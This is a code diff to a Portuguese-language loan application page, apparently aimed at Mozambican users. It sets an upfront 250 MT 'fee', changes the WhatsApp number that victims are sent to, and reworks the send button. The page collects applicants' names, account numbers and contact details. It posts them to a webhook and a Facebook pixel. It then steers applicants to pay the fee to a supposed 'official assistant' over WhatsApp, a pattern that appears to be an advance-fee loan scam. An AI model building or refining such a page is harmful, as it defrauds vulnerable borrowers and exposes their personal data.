@@ -151,7 +151,7 @@
       <h3>✅ Dados Confirmados</h3>
       <p id="msgSucesso"></p>
       <p id="msgPrestacao"></p>
-      <p>Para finalizar, efetue o pagamento da taxa <b></b>.<br>
+      <p>Para finalizar, efetue o pagamento da taxa <b>250 MT</b>.<br>
       Clique abaixo para concluir com a Senhora Filomena (Assistente Oficial).</p>
       <a id="btnWhatsApp" href="#" target="_blank" 
          onclick="enviarWebhookEIrWhatsapp(event)">
@@ -163,6 +163,7 @@
 <script>
   let nome, numero, whatsapp, valor, anos, meses, mensal;
   let webhookJaEnviado = false; // 🔒 trava para não duplicar
+  const btnWhatsApp = document.getElementById("btnWhatsApp");
 
   const form = document.getElementById("emprestimoForm");
   const popupErro = document.getElementById("popupErro");
@@ -171,7 +172,6 @@
   const popupProcessando = document.getElementById("popupProcessando");
   const msgSucesso = document.getElementById("msgSucesso");
   const msgPrestacao = document.getElementById("msgPrestacao");
-  const btnWhatsApp = document.getElementById("btnWhatsApp");
 
   form.addEventListener("submit", function(e){
     e.preventDefault();
@@ -217,15 +217,20 @@
   async function enviarWebhookEIrWhatsapp(e){
     e.preventDefault();
 
-    if(webhookJaEnviado) return; // 🚫 já foi enviado antes
-    webhookJaEnviado = true; // 🔒 trava envio
+    if(webhookJaEnviado) {
+      window.open(btnWhatsApp.href, '_blank');
+      return;
+    }
+    webhookJaEnviado = true;
 
     let mensagem = `Eu sou ${nome}! 🎉%0A` +
       `Quero receber ${valor} MT na conta ${numero}.%0A` +
       `📱 Contato WhatsApp: ${whatsapp}%0A%0A` +
       `📅 Prazo escolhido: ${anos} anos (${meses} meses)%0A` +
       `💰 Prestação mensal aproximada: ${mensal} MT/mês%0A%0A` +
-      `Quero, efetuar o pagamento da taxa de 250 MT.%0A`;
+      `Quero efetuar o pagamento da taxa de 250 MT.%0A`;
+
+    btnWhatsApp.href = `https://wa.me/258873728098?text=${mensagem}`;
 
     let payload = new URLSearchParams();
     payload.append("sessionId", numero);
@@ -254,24 +259,14 @@
         })
       ]);
 
-      // ✅ Dispara Pixel quando clicam no botão
       fbq('track', 'InitiateCheckout');
-      fbq('track', 'Lead', {
-        nome: nome,
-        numero: numero,
-        valor: valor
-      });
+      fbq('track', 'Lead', { nome: nome, numero: numero, valor: valor });
 
     } catch(err){
       console.error("Erro envio:", err);
     }
 
-    // ✅ Desabilita botão após envio
-    btnWhatsApp.innerText = "✅ Já enviado";
-    btnWhatsApp.style.pointerEvents = "none";
-
-    // Abre WhatsApp com o número atualizado
-    window.open(`https://wa.me/258853762170?text=${mensagem}`, '_blank');
+    window.open(btnWhatsApp.href, '_blank');
   }
 
   function fecharPopup(id){
